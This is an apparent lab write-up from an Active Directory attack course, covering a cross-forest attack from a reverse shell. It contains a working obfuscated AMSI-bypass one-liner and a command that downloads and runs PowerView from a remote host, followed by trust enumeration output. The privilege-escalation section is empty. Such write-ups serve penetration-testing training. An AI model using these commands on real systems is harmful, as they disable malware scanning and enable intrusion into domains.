# Hands-On 27:

```
Using the reverse shell on db.local:
- Execute cross forest attack on dbvendor.local by abusing ACLs
- Enumerate FSPs for db.local and escalate privileges to DA by compromising the FSPs.
```

## Index of content
  1. [Cross forest attack](#cross-forest-attack)
  2. [Privilege escalation](#privilege-escalation)

## Cross forest attack

Bypass amsi on revere shell:
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' )-VaL)."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ))."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
```
Download PowerView from target machine fileless and validate the trust fores :

```
PS C:\Windows\system32> iex (New-Object Net.Webclient).DownloadString("http://192.168.100.17/PowerView.ps1")
PS C:\Windows\system32> Get-ForestTrust


TopLevelNames            : {dbvendor.local}
ExcludedTopLevelNames    : {}
TrustedDomainInformation : {dbvendor.local}
SourceName               : db.local
TargetName               : dbvendor.local
TrustType                : Forest
TrustDirection           : Bidirectional
```


## Privilege escalation

